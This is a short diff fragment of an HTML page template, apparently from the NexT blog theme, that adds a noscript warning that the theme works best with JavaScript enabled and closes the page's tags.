+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
